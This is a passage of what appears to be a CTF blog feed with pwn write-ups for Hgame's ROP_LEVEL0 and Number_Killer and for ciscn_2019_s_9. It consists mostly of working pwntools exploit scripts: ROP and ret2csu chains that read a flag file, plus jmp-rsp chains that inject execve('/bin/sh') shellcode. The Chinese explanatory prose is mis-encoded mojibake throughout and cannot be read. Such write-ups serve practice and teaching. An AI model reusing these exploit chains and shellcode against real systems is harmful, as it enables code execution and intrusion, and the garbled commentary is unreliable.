class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./ROP_LEVEL0&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./ROP_LEVEL0&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>        <span class="hljs-comment">#lib = ELF(&#x27;./home/robye/Desktop/PWN/libc/64-libc-2.27.so&#x27;)</span><br>    pop_rsi_r15_ret = <span class="hljs-number">0x400751</span> <br>    pop_rdi_ret = <span class="hljs-number">0x400753</span><br>    buf = <span class="hljs-number">0x601060</span><br>    open_plt = elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    open_addr = <span class="hljs-number">0x4006A3</span><br>    payload = cyclic(<span class="hljs-number">0x50</span>+ <span class="hljs-number">8</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    <br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(<span class="hljs-number">6</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0x4004e0</span>)<span class="hljs-comment">#puts_plt</span><br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">0.5</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;./flag&quot;</span>)<br>    sh.send(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;47.103.214.163&quot;</span>,<span class="hljs-number">20003</span>,<span class="hljs-number">1</span> )<br><br></code></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><img src="/2020/01/28/Hgame/image-20200117183339217.png" class="" title="image-20200117183339217"><p>ROP_LEVEL0| SOLVED| ww        </p><img src="/2020/01/28/Hgame/92YAf7bVfc8a3fUf__thumbnail.png" class="" title="img">      é‡å¤åˆ©ç”¨æ­¤å¤„çš„gadgetè°ƒç”¨readï¼Œ openï¼Œ putså°†flagè¾“å‡ºå°±è¡Œ<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> <span class="hljs-comment">#!/usr/bin/python2</span><br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">4</span> <span class="hljs-keyword">import</span> sys<br> <span class="hljs-number">5</span> <span class="hljs-keyword">import</span> os<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> <span class="hljs-comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br> <span class="hljs-number">8</span> context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br> <span class="hljs-number">9</span> context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-number">10</span> debug = <span class="hljs-number">0</span><br><span class="hljs-number">11</span> d = <span class="hljs-number">1</span><br><span class="hljs-number">12</span> <br><span class="hljs-number">13</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br><span class="hljs-number">14</span>     execve = <span class="hljs-string">&quot;./ROP_LEVEL0&quot;</span><br><span class="hljs-number">15</span>     <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br><span class="hljs-number">16</span>         p = process(execve)<br><span class="hljs-number">17</span>         <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br><span class="hljs-number">18</span>             gdb.attach(p)<br><span class="hljs-number">19</span>     <span class="hljs-keyword">else</span>:<br><br><br><span class="hljs-number">20</span>         <span class="hljs-comment">#ip = &quot;10.0.%s.140&quot; % sys.argv[1]</span><br><span class="hljs-number">21</span>         ip = <span class="hljs-string">&quot;47.103.214.163&quot;</span><br><span class="hljs-number">22</span>         host = <span class="hljs-string">&quot;20003&quot;</span><br><span class="hljs-number">23</span>         p = remote(ip, host)<br><span class="hljs-number">24</span> <br><span class="hljs-number">25</span>     elf = ELF(<span class="hljs-string">&quot;./ROP_LEVEL0&quot;</span>)<br><span class="hljs-number">26</span> <br><span class="hljs-number">27</span>     main = <span class="hljs-number">0x40065B</span><br><span class="hljs-number">28</span>     loc1 = <span class="hljs-number">0x400730</span><br><span class="hljs-number">29</span>     loc2 = <span class="hljs-number">0x40074A</span><br><span class="hljs-number">30</span> <br><span class="hljs-number">31</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">32</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x10</span>) + p64(elf.bss()+<span class="hljs-number">0x200</span>) + p64(<span class="hljs-number">0</span>) + p64(loc1)<br><span class="hljs-number">33</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">34</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">35</span> <br><span class="hljs-number">36</span>     p.sendline(<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><span class="hljs-number">37</span> <br><span class="hljs-number">38</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">39</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;open&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(elf.bss()+<span class="hljs-number">0x200</span>) + p64(loc1)<br><span class="hljs-number">40</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">41</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">42</span> <br><span class="hljs-number">43</span>     raw_input()<br><span class="hljs-number">44</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">45</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x60</span>) + p64(elf.bss()+<span class="hljs-number">0x220</span>) + p64(<span class="hljs-number">5</span>) + p64(loc1)<br><span class="hljs-number">46</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">47</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">48</span> <br><span class="hljs-number">49</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">50</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(elf.bss() + <span class="hljs-number">0x220</span>) + p64(loc1)<br><span class="hljs-number">51</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">52</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">53</span> <br><span class="hljs-number">54</span>     p.interactive()<br><span class="hljs-number">55</span> <br><span class="hljs-number">56</span> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><span class="hljs-number">57</span>     pwn()<br></code></pre></td></tr></table></figure><p><a href="http://www.qfrost.com:4000/PWN/ä¸‡èƒ½gadget/">http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/</a></p><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123; <br><span class="hljs-comment">//char str[20];</span><br>    <span class="hljs-keyword">long</span> str = <span class="hljs-number">0x40078d</span>;<br>    <span class="hljs-keyword">long</span> temp;<br>    <span class="hljs-keyword">long</span> number = <span class="hljs-number">4196237L</span>;<br>    <span class="hljs-keyword">char</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">20</span>];<br>    temp = atol(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åè¿›åˆ¶ï¼š%d&quot;</span>,str);<br>    <span class="hljs-comment">//printf(&quot;è½¬æ¢å‰ï¼š%s ,è½¬æ¢åï¼š%d\n&quot;,str,atol(str));</span><br>    temp = number;<br>    itoa(number, <span class="hljs-built_in">string</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">//printf(&quot;è½¬æ¢å‰ï¼š%d,è½¬æ¢åï¼š%s&quot;,temp,string);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127180305749.png" class="" title="image-20200127180305749"><img src="/2020/01/28/Hgame/image-20200127180319641.png" class="" title="image-20200127180319641"><img src="/2020/01/28/Hgame/image-20200127180517996.png" class="" title="image-20200127180517996"><img src="/2020/01/28/Hgame/image-20200127180441992.png" class="" title="image-20200127180441992"><p>æ²¡æœ‰NXåŠ ä¸Šæœ‰jump rspï¼Œé‚£å°±è‚¯å®šret2shellcode</p><p>å› ä¸ºatollï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å‘shellcode</p><p>å…ˆçœ‹ä¸€ä¸‹åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127181655275.png" class="" title="image-20200127181655275"><p>çœ‹è§c,d,e,f,é‚£é‡Œï¼Œå†æµ‹ä¸€æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127184537470.png" class="" title="image-20200127184537470"><p>ç°åœ¨æˆ‘ä»¬è¿˜çœ‹è§äº†ä¸€ä¸ª1ï¼Œå¯èƒ½æ˜¯ç”¨æ¥è®°å½•å¾ªç¯æ¬¡æ•°çš„ï¼Ÿ</p><p>ç„¶åæˆ‘ä»¬è¦æ„å»ºæ ˆï¼Œå°±å¾—æŒ‰ç…§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget = [<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>]<br><br></code></pre></td></tr></table></figure><p>è¿™æ ·æ¥æ„å»º</p><blockquote><img src="/2020/01/28/Hgame/image-20200127191618340.png" class="" title="image-20200127191618340"></blockquote><img src="/2020/01/28/Hgame/image-20200127193319645.png" class="" title="image-20200127193319645"><p>è¿™æ ·æˆ‘ä»¬çœ‹è§é‚£ä¸ª0ï¼Œå¥½åƒæ”¾åœ¨äº†æœ€ä¸‹é¢ï¼Œå¹¶ä¸”æ ˆä¸­è¿˜å­˜ç•™æœ‰56789aï¼Œæ‰€ä»¥æŠŠgadgetä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget = [<br>        <span class="hljs-number">0xdeadbeef</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>]<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127194207809.png" class="" title="image-20200127194207809"><p>è¿™æ ·å°±æ²¡æœ‰é—®é¢˜å•¦ï¼Œç„¶åå°±æ˜¯å¦‚ä½•é€€å‡ºå¾ªç¯äº†</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§å¾ªç¯æ¬¡æ•°å·²ç»å˜æˆäº†b<img src="/2020/01/28/Hgame/image-20200127195248873.png" class="" title="image-20200127195248873"></p><p>ä½†å¦‚æœæˆ‘ä»¬ç»§ç»­å‘é€çš„è¯ï¼Œåˆä¼šå˜æˆ1<img src="/2020/01/28/Hgame/image-20200127200302561.png" class="" title="image-20200127200302561"></p><p>ç»è¿‡è°ƒè¯•ä¹‹åï¼Œåªæœ‰<code>sendNum((11&lt;&lt;32))</code>å¯ä»¥å°†b+1å˜æˆcï¼Œå¦åˆ™ä¼šé‡æ–°å¼€å§‹å¾ªç¯æ‰“ä¹±æ ˆå†…å¸ƒå±€</p><p>éšåï¼Œå‘é€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>,<span class="hljs-number">20</span>):<br>    sendNum(i)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127202553944.png" class="" title="image-20200127202553944"><p>ç„¶åå‘ç°ç«‹é©¬å°±å¯ä»¥è¿è¡Œç¬¬ä¸€è¡Œâ€¦..</p><p>æˆ‘ä»¬éœ€è¦æŠŠrbpæŒ‡é’ˆæŒ‡å‘ä¹‹å‰æˆ‘ä»¬æ”¾å¥½äº†çš„åœ°æ–¹ï¼Œæ‰€ä»¥è®¡ç®—ä¸€ä¸‹æ ˆåç§»ï¼Œç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = asm(<span class="hljs-string">&#x27;sub rsp,0x60;ret&#x27;</span>)<br>b = disasm(a)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127205156957.png" class="" title="image-20200127205156957"><p>æ‰€ä»¥å‘é€<code>sendNum(0xc360ec8348)</code>å†ä½¿ç”¨gitfé‡Œçš„<img src="/2020/01/28/Hgame/image-20200127205325792.png" class="" title="image-20200127205325792"></p><p>å®Œæˆè·³è½¬</p><p>éšåï¼Œç¨‹åºè¿˜éœ€è¦è¯»å…¥å…­ä¸ªæ•°ï¼Œç„¶åå³å¯</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>sh = process(<span class="hljs-string">&quot;./Number_Killer&quot;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;numbers!\n&quot;</span>)<br>gadget = [<br>        <span class="hljs-number">0xdeadbeef</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendNum</span>(<span class="hljs-params">num</span>):</span><br>    sh.sendline(<span class="hljs-built_in">str</span>(num))<br>    sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gadget:<br>    sendNum(i)<br><span class="hljs-comment">#pause()</span><br>sendNum((<span class="hljs-number">11</span>&lt;&lt;<span class="hljs-number">32</span>))<br>pause()<br>sendNum(<span class="hljs-number">0xc360ec8348</span>)<br>sendNum(<span class="hljs-number">0x400789</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hgame</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_s_9</title>
    <link href="/2020/01/25/ciscn_2019_s_9/"/>
    <url>/2020/01/25/ciscn_2019_s_9/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/25/ciscn_2019_s_9/image-20200124122128279.png" class="" title="image-20200124122128279"><p>å•¥ä¿æŠ¤æ²¡å¼€ï¼Œç¬¬ä¸€æ—¶é—´è€ƒè™‘shellcode</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122202333.png" class="" title="image-20200124122202333"><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122235034.png" class="" title="image-20200124122235034"><p>å¦å¤–leakåªæœ‰50ï¼Œleakå¤šæ‰è€ƒè™‘ç›´æ¥èµ°rop</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122303684.png" class="" title="image-20200124122303684"><p>å°è¯•è¿‡ret2libc,ä½†æ˜¯æ€ä¹ˆéƒ½è°ƒä¸å‡ºæ¥= =</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">push   eax</span><br><span class="hljs-string">push   0x68732f2f #//sh</span><br><span class="hljs-string">push   0x6e69622f # /bin</span><br><span class="hljs-string">mov    ebx,esp</span><br><span class="hljs-string">mov    ecx,eax</span><br><span class="hljs-string">mov    edx,eax</span><br><span class="hljs-string">mov    al,0xb</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">inc    eax</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode =asm(shellcode) <span class="hljs-comment">#ä½¿ç”¨shellcraft.shæ‰“ä¸é€šï¼Œä¼°è®¡æ˜¯å› ä¸ºå¤ªé•¿äº†</span><br>shell=<span class="hljs-string">&quot;sub esp,0x28;call esp&quot;</span><br>shell =asm(shell)<br>sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>payload = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += p32(<span class="hljs-number">0x8048554</span>) <span class="hljs-comment">#jmp esp</span><br>payload += shell<br>pause()<br>sh.sendline(payload)<br><br></code></pre></td></tr></table></figure><blockquote><p>ï¼ˆ1ï¼‰xorl %eax,%eax ï¼šä½¿ç”¨xoræŒ‡ä»¤æ¸…ç©ºeaxï¼Œå³ä½¿eax=0ï¼Œä¸å¯ä»¥ä½¿ç”¨movl 0,%eaxï¼Œå› ä¸ºä¼šåœ¨shellcodeä¸­å¼•å…¥â€™0â€™ï¼Œä¸€äº›å­˜åœ¨bufferoverflowçš„å‡½æ•°ï¼Œå¦‚strcpy()ï¼Œéƒ½æ˜¯åœ¨æºå­—ç¬¦ä¸²ä¸­æ£€æµ‹â€™0â€™ï¼Œè‹¥é‡åˆ°â€˜0â€™ï¼Œé»˜è®¤ä¸ºå­—ç¬¦ä¸²ç»“æŸï¼Œåˆ™ä¹‹åçš„å­—ç¬¦ä¸²ä¸ä¼šè¢«æ‹·è´ã€‚<br>ï¼ˆ2ï¼‰pushl %eax ï¼šå°†0å…¥æ ˆï¼Œæ ‡è®°äº†â€/bin/shâ€çš„ç»“å°¾ï¼Œç”¨pushlä¹Ÿå¯ä»¥é¿å…åœ¨shellcodeä¸­å¼•å…¥â€™0â€™<br>ï¼ˆ3ï¼‰pushl 0x68732f2fï¼šä¼ é€’â€/shâ€ï¼Œä¸ºäº†4å­—èŠ‚å¯¹é½ï¼Œä½¿ç”¨//shï¼Œè¿™åœ¨execve()ä¸­ç­‰åŒäº/sh<br>ï¼ˆ4ï¼‰pushl â€‹0x6e69622fï¼šä¼ é€’â€œ/binâ€ï¼Œä¸º4ä¸ªå­—èŠ‚ã€‚<br>ï¼ˆ5ï¼‰movl %esp,%ebx ï¼šæ­¤æ—¶espæŒ‡å‘äº†â€/bin/shâ€,é€šè¿‡espå°†è¯¥å­—ç¬¦ä¸²çš„å€¼ä¼ 